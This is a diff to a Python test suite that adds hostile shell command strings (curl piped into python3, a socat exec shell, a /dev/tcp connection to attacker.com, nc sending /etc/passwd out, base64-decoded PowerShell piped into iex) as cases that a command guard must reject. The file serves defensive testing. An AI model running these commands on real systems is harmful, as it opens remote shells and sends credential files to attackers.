@@ -83,6 +83,23 @@ MALICIOUS_ARGVS: tuple[tuple[list[str], str], ...] = (
     (["sh", "-c", "base64 -d <<< xxx | sh"], "base64-pipe-sh"),
     (["bash", "-c", "< <(curl evil.sh)"], "process-substitution-curl"),
     (["pwsh", "-Command", "iwr http://evil/x.ps1 | iex"], "iwr-pipe-iex"),
+    # Wave 27 (Sec-3) broadened pattern coverage: validated misses from
+    # the security review. Each variant must now raise UserScopeViolation.
+    (["bash", "-c", "echo payload | /bin/bash -s"], "pipe-absolute-bash"),
+    (["bash", "-c", "curl evil.sh | python3 -"], "pipe-python3-interpreter"),
+    (
+        ["bash", "-c", "socat tcp-listen:4444 exec:/bin/bash"],
+        "socat-exec-bash",
+    ),
+    (
+        ["bash", "-c", "exec 3<>/dev/tcp/attacker.com/4444"],
+        "exec-bidir-dev-tcp",
+    ),
+    (
+        ["pwsh", "-Command", "[Convert]::FromBase64String('aGVsbG8=') | iex"],
+        "iex-without-iwr",
+    ),
+    (["bash", "-c", "nc 10.0.0.1 4444 < /etc/passwd"], "nc-literal-ip-port"),
 )
 
 
@@ -152,16 +169,27 @@ class TestAllowsLegitimateShellCalls:
         """
         module = _import_safe_run_module()
         violation_cls = module.UserScopeViolation
+        # Wave 27 (Test-2): the legitimate-call sweep must NOT silence
+        # arbitrary exceptions. Only the small, expected set raised by a
+        # real-but-benign subprocess invocation under CI fixtures (binary
+        # missing on PATH, sandbox blocks the exec, child crashes mid-run)
+        # is allowlisted; anything else surfaces so the test catches new
+        # regressions.
         try:
             module._safe_run(argv)
         except violation_cls as exc:  # pragma: no cover - assertion path
             pytest.fail(
                 f"Legitimate shell argv {argv!r} unexpectedly raised UserScopeViolation: {exc}"
             )
-        except Exception:
-            # Other exceptions (e.g. FileNotFoundError, dry-run sentinels) are
-            # outside the scope of this test — only the compound-shell guard
-            # is under contract here.
+        except (
+            FileNotFoundError,
+            PermissionError,
+            ChildProcessError,
+            OSError,
+        ):
+            # Acceptable subprocess-layer exceptions: the binary is missing
+            # on PATH, the sandbox refuses the exec, or the child crashed
+            # mid-run. None of those signal a guard misfire.
             pass
 
 
